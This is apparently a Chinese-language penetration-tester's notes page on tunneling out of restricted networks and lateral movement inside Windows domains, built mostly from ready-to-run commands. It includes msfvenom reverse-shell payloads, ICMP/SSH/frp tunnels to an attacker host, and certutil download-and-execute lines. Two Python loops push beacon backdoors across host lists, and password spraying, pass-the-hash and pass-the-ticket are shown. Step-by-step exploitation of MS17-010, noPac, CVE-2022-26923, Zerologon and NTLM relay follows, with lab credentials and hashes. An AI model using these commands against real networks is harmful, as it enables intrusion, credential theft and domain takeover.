![image.png](https://img13.360buyimg.com/ddimg/jfs/t1/160641/31/37617/38655/64aa8edaFfdbb65ad/bfe2c8b5d9285896.jpg)

### 代理和隧道

判断是否在域

~~~
// 判断是否在域
net view /domain
net time /domain
ipconfig /all		//主dns后缀
//查看域管理员
net localgroup "domain admins" /domain
//查看域控
net group "domain controllers" /domain
//查看域控所在的IP
net group "domain controllers" /domain	-->  ping OWA
net time /domain	-->  ping OWA


~~~

BloodHound

上传 BloodHound-win32-x64\resources\app\Collectors 内的SharpHound.exe到服务器执行

~~~
SharpHound.exe -c all
~~~

会在本地生成压缩包，放在本地用BloodHound工具分析

打开neo4j

~~~
neo4j.bat console
~~~

然后打开BloodHound，输入账号密码neo4j：2019xxxxxx



~~~
隧道：协议不出网
代理：解决网络通讯
~~~



如果不出网怎么办

~~~
假设有p1(不出网) ，p2(出网)
1.通过拿下p2之后正向控制p1
2.通过隧道技术，使p1通过其他协议出网
~~~

#### icmp

场景1：

msf:https://github.com/esrrhs/pingtunnel/releases/

~~~python
机器一（内网-不出网主机）：192.168.52.143
机器三（公网-msf主机）：129.226.92.29



//[机器一]对tcp协议进行了限制，我们运行msf.exe木马后将流量通过icmp给到内网的[机器二]，[机器二]通过命令将icmp变成tcp流量给[机器三]

机器一：


msfvenom -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 lport=3333 -f exe -o xd.exe

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 4444
exploit

kali开启隧道
./pingtunnel.exe -type server
./pingtunnel -type server
win开启隧道 // 将本地的icmp协议数据转发至msf的4444端口上
pingtunnel.exe -type client -l 127.0.0.1:3333 -s 129.226.92.29 -t 129.226.92.29:4444 -tcp 1 -noprint 1 -nolog 1
~~~

cs

~~~
pingtunnel.exe -type client -l 127.0.0.1:5555 -s 129.226.92.29 -t 129.226.92.29:6666 -tcp 1 -noprint 1 -nolog 1
~~~





~~~

kali-> 
msf需要添加路由，cs不用添加路由
//msf下的meterpreter下查看是否有路由
msfvenom -p windows/meterpreter/reverse_tcp lhost=129.226.92.29 lport=3333 -f exe -o xd1234.exe
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 3333
run
run autoroute -p
~~~

[![ppvMzNt.png](https://s1.ax1x.com/2023/04/13/ppvMzNt.png)](https://imgse.com/i/ppvMzNt)

~~~
//添加路由，此时只是msf有路由，但是工具没有路径
run post/multi/manage/autoroute
// 给工具添加路由，建立节点
background
use auxiliary/server/socks_proxy
show options
set SRVPORT 1122
run
~~~

[![ppvlfF1.png](https://s1.ax1x.com/2023/04/13/ppvlfF1.png)](https://imgse.com/i/ppvlfF1)

~~~
//用proxifier代理
129.226.92.29 1122
~~~

[![ppvlISK.png](https://s1.ax1x.com/2023/04/13/ppvlISK.png)](https://imgse.com/i/ppvlISK)

访问内网的192.168.52.110（不出网）

[![ppvl7Oe.png](https://s1.ax1x.com/2023/04/13/ppvl7Oe.png)](https://imgse.com/i/ppvl7Oe)



cs

~~~
~~~

[![ppvGXDS.png](https://s1.ax1x.com/2023/04/13/ppvGXDS.png)](https://imgse.com/i/ppvGXDS)









上线控制

cs

~~~
//已经建立隧道后，建立监听器 bind_tcp 50051
//放在win10上执行，本地在已出网的shell主机是192.168.52.143，在他的交互下执行
connect 192.168.52.110 50051
~~~

[![ppvJTZF.png](https://s1.ax1x.com/2023/04/13/ppvJTZF.png)](https://imgse.com/i/ppvJTZF)

同理，如果是多层代理，就相应的在这个win10上再开sock5

msf

~~~
//同理，生成本地后门
msfvenom -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 lport=3333 -f exe -o xxx.exe

use exploit/multi/handler
set payload windows/meterpreter/bind_tcp
set lhost 192.168.52.110
set lport 3333
exploit
~~~



~~~
proxychains linux上的
~~~





使用代理转发上线

[![ppxDRat.png](https://s1.ax1x.com/2023/04/13/ppxDRat.png)](https://imgse.com/i/ppxDRat)

这里必须是192.168.52.143，因为win10的地址是192.168.52.110



[![ppxDHqs.png](https://s1.ax1x.com/2023/04/13/ppxDHqs.png)](https://imgse.com/i/ppxDHqs)



~~~
隧道技术
反向连接
关闭->替换->替换
~~~

https://www.cnblogs.com/tomtellyou/p/16300557.html

~~~
查看当前防火墙状态：netsh advfirewall show allprofiles
关闭防火墙：netsh advfirewall set allprofiles state off
开启防火墙：netsh advfirewall set allprofiles state on
恢复初始防火墙设置：netsh advfirewall reset
启用桌面防火墙: netsh advfirewall set allprofiles state on

但是需要看权限，如果是域用户，防火墙是域控管理员同步设置的，自己无法修改;如果不是同步则可以
如果是工作组用户，只要当前用户具备权限就可以关闭（可以提权完再试）
~~~



隧道

DNS，SMB，ICMP，SSH

~~~
icmp通过ping判断
smb是445开放
dns是 nslookup dig
ssh是22
~~~



#### SMB

创建监听器

[![ppz3IZF.png](https://s1.ax1x.com/2023/04/14/ppz3IZF.png)](https://imgse.com/i/ppz3IZF)

[![ppz3TIJ.png](https://s1.ax1x.com/2023/04/14/ppz3TIJ.png)](https://imgse.com/i/ppz3TIJ)

#### DNS

~~~
区域传输tcp
域名解析udp
~~~

添加三条记录

[![ppzGe6x.png](https://s1.ax1x.com/2023/04/14/ppzGe6x.png)](https://imgse.com/i/ppzGe6x)

[![ppzGM7D.png](https://s1.ax1x.com/2023/04/14/ppzGM7D.png)](https://imgse.com/i/ppzGM7D)[![ppzGlAe.png](https://s1.ax1x.com/2023/04/14/ppzGlAe.png)](https://imgse.com/i/ppzGlAe)

[![ppzG4N4.png](https://s1.ax1x.com/2023/04/14/ppzG4N4.png)](https://imgse.com/i/ppzG4N4)

。

上线后执行

~~~
mode dns-txt
~~~

#### ssh

无法通过cs上线

linux上开启ssh登陆

~~~
vi /etc/ssh/sshd_config
PermitRootLogin yes
PasswordAuthentication yes

/etc/init.d/ssh start
/etc/init.d/ssh restart

本地：出站被封，则让linux转发给本地，我们主动去连接
ssh -CfNg -L 1122:192.168.1.15:8080 root@192.168.1.166
curl http://127.0.0.1:1122
-----------------------------------------------------------------------------------------
远程：入站被封，则让linux将内网的地址转发给外网的某某端口



ssh -CfNg -R 1234:192.168.1.15:8080 root@129.226.92.29
curl http://127.0.0.1:1234
~~~

https://gloxec.github.io/CrossC2/zh_cn/

针对linux的cs上线

因为正向只支持tcp，反向只支持https，所以我们创建一个https监听器

[![ppzdiKs.png](https://s1.ax1x.com/2023/04/14/ppzdiKs.png)](https://imgse.com/i/ppzdiKs)

创建反向https

[![ppzdNGD.png](https://s1.ax1x.com/2023/04/14/ppzdNGD.png)](https://imgse.com/i/ppzdNGD)[![ppzdaxH.png](https://s1.ax1x.com/2023/04/14/ppzdaxH.png)](https://imgse.com/i/ppzdaxH)

~~~
/home/ubuntu/genCrossC2.Linux 129.226.92.29 5555 ./.cobaltstrike.beacon_keys null Linux x64 t_cc2.out
~~~

在服务端执行这个命令

[![ppzwmwt.png](https://s1.ax1x.com/2023/04/14/ppzwmwt.png)](https://imgse.com/i/ppzwmwt)

生成了t_cc2.out，放在kali上执行

~~~
./t_cc2.out
~~~



~~~
./genCrossC2.Linux 129.226.92.29 5555 null null Linux x64 test
~~~





#### 内网穿透

~~~
ngrok，frp，spp，ew，nps
~~~





~~~
内网msf		192.168.1.101
内网被控机 * 1		192.168.0.121 
公网ngrok :   tcp://batmanfuture.free.com 12345		设置转发内部127.0.0.1和cs监听端口5555

内网msf生成payload： batmanfuture.free.com 12345   shell.exe,运行sunny.exe


~~~

##### Frp

https://github.com/fatedier/frp/releases

安装ftp：https://blog.csdn.net/qq_43557686/article/details/126028541

~~~
//查看服务器linux的架构
arch
x86_64 -> X86架构
https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz
aarch64 -> ARM架构
https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_arm64.tar.gz
服务端
./frps -c ./frps.ini
客户端
frpc.exe -c frpc.ini
~~~





### 横向移动

#### IPC$

##### at和schtasks

~~~shell
1. at < windows2012
net use \\192.168.52.138\ipc$ "A@2019gaokaowar" /user:god.org\administrator #建立ipc连接
copy 4444.exe \\192.168.52.138\c$  #拷贝可执行文件到目录
at \\192.168.52.138 19:45 c:\4444.exe  # 添加计划任务
connect 192.168.52.138 4444

1. schtasks > windows2012
net use \\192.168.3.21\ipc$ "Admin12345" /user/god.org\administrator #建立ipc连接
copy beacon.exe \\192.168.3.21 c:\beancon.exe #拷贝可执行文件到目录

schtasks /create /s 192.168.52.138 /ru "SYSTEM" /tn adduser /sc DAILY /tr c:\4444.exe /F #创beacon任务对应执行文件
schtasks /run /s 192.168.52.138 /tn adduser /i #运行adduser任务
schtasks /delete /s 192.168.52.138 /tn adduser /f#删除adduser任务

connect 192.168.3.32 #连接192.168.3.32
~~~

##### impacket + sock5隧道

~~~shell
上传atexec.exe执行
atexec.exe god/administrator:A@2019gaokaowar@192.168.52.138 "whoami"

atexec.exe -hashes :xxxxxxxxxxxxxx god/administrator@192.168.52.138 "whoami"
~~~

或者直接自己开sock5隧道，然后直接用自己的xxx.py套件就可以了

~~~python
import os,time
ips={
    '192.168.3.21',
    '192.168.3.25',
    '192.168.3.29',
    '192.168.3.30',
    '192.168.3.32'
}

users={
    'Administrator',
}
passs={
    'admin!@#45'
}


def xz():#下载后门
    for ip in ips:
        for user in users:
            for mima in passs:
                exec1='D:\Myproject\\venv\Scripts\python.exe D:\Myproject\impacket-master\examples\\atexec.py ./administrator:'+mima+'@'+ip+' "certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe"'
                exec2='D:\Myproject\\venv\Scripts\python.exe D:\Myproject\impacket-master\examples\\atexec.py god/'+user+':'+mima+'@'+ip+' "certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe"'
                #exec3='atexec.exe ./administrator:admin!@#45@192.168.3.32 "certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe"'
                print('--->'+exec1+'<---')
                print('--->' + exec2 + '<---')
                os.system(exec1)
                os.system(exec2)

def zx():#执行后门
    for ip in ips:
        for user in users:
            for mima in passs:
                #exec="net use \\"+ "\\"+ip+'\ipc$ '+mima+' /user:god\\'+user
                exec1 = 'D:\Myproject\\venv\Scripts\python.exe D:\Myproject\impacket-master\examples\\atexec.py ./administrator:' + mima + '@' + ip + ' "c:/beacon.exe"'
                exec2 = 'D:\Myproject\\venv\Scripts\python.exe D:\Myproject\impacket-master\examples\\atexec.py god/' + user + ':' + mima + '@' + ip + ' "c:/beacon.exe"'
                #exec3='atexec.exe ./administrator:admin!@#45@192.168.3.32 "certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe"'
                print('--->' + exec1 + '<---')
                print('--->' + exec2 + '<---')
                os.system(exec1)
                os.system(exec2)

if __name__ == '__main__':
    xz()
    zx()

~~~



#### WMI

135端口

~~~
// 1.单执行:不支持hash
wmic /node:192.168.52.38 /user:administrator /password:admin!@45 process call create "cmd.exe /c certutil -urlcache -split -f http://xxxx/shell.exe"

// 2.反弹shell形式，cs无法利用
cscript //nologo wmiexec.vbs /shell 192.168.52.138 administrator A@2019gaokaowar
~~~

wmiexec.vbs放在上面执行就可以了

[![p9Svkkj.png](https://s1.ax1x.com/2023/04/15/p9Svkkj.png)](https://imgse.com/i/p9Svkkj)

[![p9SvAts.png](https://s1.ax1x.com/2023/04/15/p9SvAts.png)](https://imgse.com/i/p9SvAts)

~~~
// 3.利用impacket套件
wmiexec ./administrator:A@2019gaokaowar@192.168.52.138 "whoami"
wmiexec -hashes:xxxxxxxxxxxxxxxx ./administrator@192.168.52.138 "whoami"
// 下载后门，并执行
wmiexec ./administrator:A@2019gaokaowar@192.168.52.138 "certutil -urlcache -split -f http://192.168.52.143/4444.exe c:/beacon.exe"

wmiexec ./administrator:A@2019gaokaowar@192.168.52.138 "c:/beacon.exe"
~~~

[![p9SxpCR.png](https://s1.ax1x.com/2023/04/15/p9SxpCR.png)](https://imgse.com/i/p9SxpCR)

[![p9Sxdx0.png](https://s1.ax1x.com/2023/04/15/p9Sxdx0.png)](https://imgse.com/i/p9Sxdx0)

#### SMB

~~~
// 1.psexec
psexec64 \\192.168.52.138 -u administrator -p A@2019gaokaowar -s cmd
// impacket套件内的
psexec -hashes:xxxxxxxxxxxxxxxxxx ./administrator@192.168.52.138
~~~

[![p9Szjh9.png](https://s1.ax1x.com/2023/04/15/p9Szjh9.png)](https://imgse.com/i/p9Szjh9)

~~~
// 2.smbexec
smbexec ./administrator:A@2019gaokaowar@192.168.52.138
smbexec god/administrator:A@2019gaokaowar@192.168.52.138

smbexec -hashes: xxxxxxxxxxxxxxxxxxx ./administrator@192.168.52.138
smbexec -hashes: xxxxxxxxxxxxxxxxxxx god/administrator@192.168.52.138

// 3.services（单执行）
services -hashes : xxxxxxxxxxxxxxxxxxxxx ./administrator:@192.168.52.138 create -name shell -display shellexec -path c:windows\system32\shell.exe
~~~

python脚本

~~~python
import os

ips=['192.168.3.21','192.168.3.25','192.168.3.29','192.168.3.28','192.168.3.30','192.168.3.32']

def down():
    for ip in ips:
        wmi_exec='D:\Myproject\\venv\Scripts\python.exe D:\Myproject\impacket-master\examples\\wmiexec.py ./administrator:admin!@#45@%s "cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/4455.exe c:/4455.exe"'%ip
        print(wmi_exec)
        os.system(wmi_exec)

def zx():
    for ip in ips:
        wmi_exec='D:\Myproject\\venv\Scripts\python.exe D:\Myproject\impacket-master\examples\\wmiexec.py ./administrator:admin!@#45@%s "c:/4455.exe"'%ip
        print(wmi_exec)
        os.system(wmi_exec)

if __name__ == '__main__':
    down()
    zx()

~~~



##### CrackMapExec

前提，30394，先在你的cs上开一个sock4代理，然后将这个端口号记住，在proxychains上修改绑定

~~~
linux + proxychains + CrackMapExec
~~~

proxychains的安装

~~~
sudo apt-get install proxychains
vim /etc/proxychains.conf
~~~

CrackMapExec安装

https://www.freebuf.com/sectool/184573.html

~~~
apt-get install -y libssl-dev libffi-dev python-dev build-essential
pip install crackmapexec
~~~



~~~
// 密码喷洒-域(明文)
proxychains4 cme smb 192.168.52.1-255 -u administrator -p 'A@2019gaokaowar'
// 密码喷洒-本地
proxychains4 cme smb 192.168.52.1-255 -u administrator -p 'A@2019gaokaowar' --local-auth

//密码喷洒-hash
proxychains python cme smb 192.168.52.1-255 -u administrator -h 'zxxxxxxxxxxxxx'

e45e329feb5d925b
a3f549b17b4b3dde

//密码喷洒-将密码放在p.txt中，用户名放在u.txt中,ip放在i.txt
proxychains4 cme smb 192.168.52.138 -u u.txt -p p.txt -x "certutil -urlcache -split -f http://192.168.52.143/6666.exe c:/6666.exe & 6666.exe"
~~~

利用喷洒上线

[![p9pAXNV.png](https://s1.ax1x.com/2023/04/15/p9pAXNV.png)](https://imgse.com/i/p9pAXNV)[![p9pAjhT.png](https://s1.ax1x.com/2023/04/15/p9pAjhT.png)](https://imgse.com/i/p9pAjhT)





#### PTH

在2012 R2之前是

~~~
pass the hash
lm ntlm  NTLM认证攻击
// mimikatz
mimikatz privilege:debug
mimikatz sekurlsa::pth /user:administrator /domain:192.168.52.141 /ntlm:069f3f91c44c631880d58af546516f45

mimikatz sekurlsa::pth /user:liukaifeng01 /domain:192.168.52.138 /ntlm:069f3f91c44c631880d58af546516f45



dir \\192.168.52.138\C$
copy batman-batman.exe \\192.168.52.138\c$

sc \\owa create bsshell binpath= "c:\batman-batman.exe"
sc \\owa start bsshell


psexec -hashes :NTLM值 域名/域用户@域内ip地址
smbexec -hashes :NTLM值 域名/域用户@域内ip地址
wmiexec -hashes :NTLM值 域名/域用户@域内ip地址
python psexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
python smbexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32

~~~

~~~python
# 如下，利用psexec进行pth横向移动拿到域控
python psexec.py -hashes :069f3f91c44c631880d58af546516f45 god/administrator@192.168.52.138
~~~

[![p99yC8I.png](https://s1.ax1x.com/2023/04/16/p99yC8I.png)](https://imgse.com/i/p99yC8I)

~~~python
# 利用smb横向移动
python smbexec.py -hashes :069f3f91c44c631880d58af546516f45 god/administrator@192.168.52.138
~~~

![image-20230416135647101](C:\Users\batma\AppData\Roaming\Typora\typora-user-images\image-20230416135647101.png)



#### PTK

~~~
pass the key
ekeys 256 NTLM认证攻击

#域横向移动-PTK-Mimikatz&AES256
PTK = Pass The Key，当系统安装了KB2871997补丁且禁用了NTLM的时候，
那我们抓取到的ntlm hash也就失去了作用，但是可以通过PTK的攻击方式获得权限。
mimikatz sekurlsa::ekeys
mimikatz sekurlsa::pth /user:域用户名 /domain:域名 /aes256:aes256值
~~~







#### PTT

~~~
//1.利用ms14-068.exe  这是漏洞，可以利用票据提升到域控管理员权限
pass the ticket
利用票据凭证TGT进行渗透-基于Kerberos认证攻击
//获取当前用户的SID值  S-1-5-21-2952760202-1353902439-2381784089-500
shell whoami/user
//利用生成票据文件,如图
MS14-068.exe -u administrator@god.org -s S-1-5-21-2952760202-1353902439-2381784089-500 -d 192.168.52.138 -p A@2019gaokaowar
~~~

[![p9960Yj.png](https://s1.ax1x.com/2023/04/16/p9960Yj.png)](https://imgse.com/i/p9960Yj)

~~~
shell klist purge
//导入票据
mimikatz kerberos::ptc TGT_administrator@god.org.ccache
~~~

[![p99cENQ.png](https://s1.ax1x.com/2023/04/16/p99cENQ.png)](https://imgse.com/i/p99cENQ)

~~~
//2.利用kekeo(高权限，需NTLM)-利用获取的NTLM生成新的票据尝试认证   这不是漏洞，只是票据生成
因为当前主机肯定之前与其他主机连接过，所以本地应该生成了一些票据，
我们可以导出这些票据，然后再导入票据，利用。该方法类似于cookie欺骗
缺点：票据是有有效期的，所以如果当前主机在连接过域控的话，有效期内可利用。
//上传kekeo然后执行，生成TGT_Administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi
生成票据：
shell kekeo "tgt::ask /user:Administrator /domain:god.org /ntlm:069f3f91c44c631880d58af546516f45" "exit"
~~~

[![p99chb8.png](https://s1.ax1x.com/2023/04/16/p99chb8.png)](https://imgse.com/i/p99chb8)

~~~
导入票据：shell kekeo "kerberos::ptt TGT_Administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi" "exit"
查看票据：mimikatz kerberos::list   powershell klist purge
利用票据连接：shell dir \\192.168.52.138\c$
注意：成功不成功看ntlm哈希值的正确性
~~~



~~~
3、mimikatz(高权限,需Ticket)-利用历史遗留的票据重新认证尝试
导出票据：
mimikatz sekurlsa::tickets /export
导入票据：
mimikatz kerberos::ptt C:\Users\webadmin\Desktop\[0;22d3a]-2-1-40e00000-Administrator@krbtgt-god.org.kirbi
查看票据：shell klist
利用票据连接：shell dir \\owa2010cn-god\c$
注意：成功不成功看当前主机有没有被目标连接过



#域横向移动-PTH-Proxychains&CrackMapExec
CrackMapExec
Github：https://github.com/Porchetta-Industries/CrackMapExec
官方手册：https://mpgn.gitbook.io/crackmapexec/
部案例：https://www.freebuf.com/sectool/184573.html
下载对应release，建立socks连接，设置socks代理，配置规则，调用！
1、Linux Proxychains使用
代理配置：Proxychains.conf
代理调用：Proxychains 命令
2、密码喷射-域用户登录PTH：
proxychains python cme smb 192.168.3.21-32 -u user.txt -H 518b98ad4178a53695dc997aa02d455c #域用户HASH登录
proxychains python cme smb 192.168.3.21-32 -u administrator -H 518b98ad4178a53695dc997aa02d455c --local-auth #本地用户HASH登录
~~~



#### RDP

~~~
明文连接：
mstsc /console /v:192.168.3.32 /admin
HASH连接：
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:administrator /domain:192.168.52.143 /ntlm:069f3f91c44c631880d58af546516f45 "/run:mstsc /restrictedadmin"
~~~









#### WINRM

~~~
RM服务
RS命令

Windows 2008 以上版本默认自动状态，Windows Vista/win7上必须手动启动；
Windows 2012之后的版本默认允许远程任意主机来管理

攻击机开启：
winrm quickconfig -q
winrm set winrm/config/Client @{TrustedHosts="*"}
1.探针可用：
cs 内置端口扫描5985
powershell Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}
2.连接执行：
winrs -r:192.168.52.138 -u:god\administrator -p:A@2019gaokaowar whoami
winrs -r:192.168.3.21 -u:192.168.3.21\administrator -p:Admin12345 whoami
3.上线CS&MSF:
winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 "cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe beacon.exe & beacon.exe"


~~~

[![p9942FK.png](https://s1.ax1x.com/2023/04/16/p9942FK.png)](https://imgse.com/i/p9942FK)



#### SPN扫描（非横向移动）

~~~
1.扫描：
powershell setspn -T god.org -q */*
powershell setspn -T god.org -q */* | findstr "MSSQL"
2.检测：
Rubeus kerberoast
3.请求：（要产生票据文件）
powershell Add-Type -AssemblyName System.IdentityModel
powershell New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/owa.god.org:1433"
mimikatz kerberos::ask /target:MSSQLSvc/SqlServer.god.org:1433
4.导出：
mimikatz kerberos::list /export
5.破解：
python tgsrepcrack.py pass.txt "1-40a00000-jack@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi"
5.重写：
https://www.freebuf.com/articles/system/174967.html
~~~

#### Kerberoasting

~~~
目的：在无法得到明文和ntlm hash时，利用这个漏洞，先spn扫描域内存在的服务，找到用rc4加密的票据，和这个服务建立连接，查看建立连接后的票据，进行导出，利用工具对这个票据进行爆破，得到密码，再把这个密码尝试进行其他横向移动
~~~



~~~
Kerberos-请求&破解&重写
Kerberoasting 攻击的利用：
•SPN服务发现
•请求服务票据
•服务票据的导出
•服务票据的暴力破解
https://github.com/GhostPack/Rubeus
https://github.com/nidem/kerberoast
https://www.freebuf.com/articles/system/174967.html
如需利用需要配置策略加密方式(对比)
黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。
DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。
请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。
黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。
如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。
Kerberos攻击条件：
采用rc4加密类型票据，工具Rubeus检测或看票据加密类型
~~~



#### Exchange

~~~
1、端口扫描
exchange会对外暴露接口如OWA,ECP等，会暴露在80端口，而且25/587/2525等端口上会有SMTP服务，所以可以通过一些端口特征来定位exchange。
2、SPN扫描
powershell setspn -T 0day.org -q */*
3、脚本探针
python Exchange_GetVersion_MatchVul.py 120.36.143.14
#域横向移动-内网服务-Exchange爆破
1、Burp+Proxifier

#域横向移动-内网服务-Exchange漏洞
确定内核版本-筛选Server版本-确定漏洞对应关系-选择漏洞进行漏洞
参考图
CVE-2020-0688
CVE-2020-17144
https://www.cnblogs.com/xiaozi/p/14481595.html
~~~

[![p9CwctI.png](https://s1.ax1x.com/2023/04/17/p9CwctI.png)](https://imgse.com/i/p9CwctI)



#### 域控提取

#### MS17-010

###### CS到MSF

[![ppsC7cR.png](https://s1.ax1x.com/2023/03/26/ppsC7cR.png)](https://imgse.com/i/ppsC7cR)

先设置监听器

[![ppsC5h4.png](https://s1.ax1x.com/2023/03/26/ppsC5h4.png)](https://imgse.com/i/ppsC5h4)

在msf中设置好payload监听：

~~~
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 0.0.0.0
set lport 20000
run
~~~

然后cs中执行spawn 123

[![ppsCW7T.png](https://s1.ax1x.com/2023/03/26/ppsCW7T.png)](https://imgse.com/i/ppsCW7T)

成功收到会话

##### 检测MS17-010是否存在

~~~
//查看路由
run autoroute -p
//设置路由
run post/multi/manage/autoroute
//检测ms17-010
use auxiliary/scanner/smb/smb_ms17_010
set rhosts 192.168.52.110-143
set threads 5
run
~~~

结果：

~~~
[+] 192.168.52.110:445    - Host is likely VULNERABLE to MS17-010! - Windows 10 Enterprise 2016 LTSB 14393 x64 (64-bit)
[+] 192.168.52.138:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (64-bit)
[+] 192.168.52.141:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2003 3790 x86 (32-bit)
[+] 192.168.52.143:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
~~~

[![p9CDPl6.png](https://s1.ax1x.com/2023/04/17/p9CDPl6.png)](https://imgse.com/i/p9CDPl6)

~~~
//设置ms17-010的payload进行攻击[不出网]
use exploit/windows/smb/ms17_010_eternalblue
set rhosts 192.168.52.138
set payload windows/x64/meterpreter/bind_tcp	windows/x64/powershell_bind_tcp
//这里的target是1的地方就是你sessions -i 里面的
set target 1
run
~~~



#### CVE-2021-42287（Nopac）

~~~python
#横向移动-域控提权-CVE-2021-42287
前提条件：一个域内普通账号
影响版本：Windows基本全系列
https://github.com/cube0x0/noPac
https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools
前置：
1、代理后：
修改Host绑定域名和IP
2、扫描探针：
noPac scan -domain god.org -user administrator -pass A@2019gaokaowar
3、利用连接：
noPac -domain god.org -user administrator -pass A@2019gaokaowar /dc owa.god.org /mAccount dadd /mPassword sdadasdsa /service cifs /ptt

PsExec \\owa.god.org cmd


https://github.com/WazeHell/sam-the-admin

python sam_the_admin.py god/'administrator:A@2019gaokaowar' -dc-ip 192.168.52.138 -shell
~~~

#### CVE-2022-26923

~~~
#横向移动-域控提权-CVE-2022-26923
当Windows系统的Active Directory证书服务（CS）在域上运行时，由于机器账号中的dNSHostName属性不具有唯一性，域中普通用户可以将其更改为高权限的域控机器账号属性，然后从Active Directory证书服务中获取域控机器账户的证书，导致域中普通用户权限提升为域管理员权限。
影响：Win8.1、Win10、Win11、WinServer2012R2、WinServer2016、WinServer2019、WinServer2022等版本
前提条件：
1、一个域内普通账号
2、域内存在证书服务器
Kali添加访问域内信息 /etc/hosts
192.168.1.15 xiaodi.local
192.168.1.15 xiaodi-WIN-3C7SS32SQ6R-CA
192.168.1.15 WIN-3C7SS32SQ6R.xiaodi.local

获取CA结构名和计算机名
certutil -config - -ping
域内信息
192.168.1.15
test Pass123
xiaodi-WIN-3C7SS32SQ6R-CA
WIN-3C7SS32SQ6R.xiaodi.local

1、申请低权限用户证书：
certipy req 'xiaodi.local/test:Pass123@WIN-3C7SS32SQ6R.xiaodi.local' -ca xiaodi-WIN-3C7SS32SQ6R-CA -template User -debug
2、检测证书
certipy auth -pfx test.pfx
3、创建一个机器账户：
python3 bloodyAD.py -d xiaodi.local -u test -p 'Pass123' --host 192.168.1.15 addComputer pwnmachine 'CVEPassword1234*'
4、设置机器账户属性(dNSHostName和DC一致)：
python3 bloodyAD.py -d xiaodi.local -u test -p 'Pass123' --host 192.168.1.15 setAttribute 'CN=pwnmachine,CN=Computers,DC=xiaodi,DC=local' dNSHostName '["WIN-3C7SS32SQ6R.xiaodi.local"]'
5、再次申请证书：
certipy req 'xiaodi.local/pwnmachine$:CVEPassword1234*@192.168.1.15' -template Machine -dc-ip 192.168.1.15 -ca xiaodi-WIN-3C7SS32SQ6R-CA
6、检测证书：
certipy auth -pfx ./win-3c7ss32sq6r.pfx -dc-ip 192.168.1.15
7、导出HASH：
python3 secretsdump.py 'xiaodi.local/win-3c7ss32sq6r$@WIN-3C7SS32SQ6R.xiaodi.local' -hashes :10e02bef2258ad9b239e2281a01827a4
8、利用HASH：
python3 wmiexec.py xiaodi.local/administrator@192.168.1.15 -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd

~~~



#### NetLogon(CVE-2020-1472)

~~~
#横向移动-域控提权-CVE-2020-1472
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2012
Windows Server 2012 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 R2 (Server Core installation)
Windows Server 2016
Windows Server 2016 (Server Core installation)
Windows Server 2019
Windows Server 2019 (Server Core installation)
Windows Server, version 1903 (Server Core installation)
Windows Server, version 1909 (Server Core installation)
Windows Server, version 2004 (Server Core installation)

重置密码：
https://github.com/dirkjanm/CVE-2020-1472
恢复密码：
https://github.com/risksense/zerologon
https://github.com/SecureAuthCorp/impacket
0、获取计算机名：
nbtscan -v -h 192.168.3.21
1、连接DC清空凭证：
proxychains python cve-2020-1472-exploit.py owa 192.168.52.138
2、获取域内HASH:
proxychains python secretsdump.py owa\$@192.168.52.138 -just-dc -no-pass

python secretsdump.py "god/administrator":"hongrisec@2021@"@192.168.52.138
3、连接域控PTH：
python wmiexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21
4、后续恢复密码：
~~~



#### NTLM Relay中继攻击

~~~
//老规矩，在cs中上线提权到system后会话给MSF
msf:
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 0.0.0.0
set lport 4123
run
//设置路由
run autoroute -p
run post/multi/manage/autoroute
background
use exploit/windows/smb/smb_relay
set smbhost 192.168.52.138
set autorunscript post/windows/manage/migrate
//因为不出网，所以设置成正向连接
set payload windows/meterpreter/bind_tcp
set rhost 192.168.52.138 //设置连接目标
run

//然后在出网的机器执行dir \\129.226.92.29\c$，就会在msf上上线  129.226.92.29是公网的攻击机器
ps
steal_token 1396   migrate 1396
dir \\129.226.92.29\c$

===============================================================

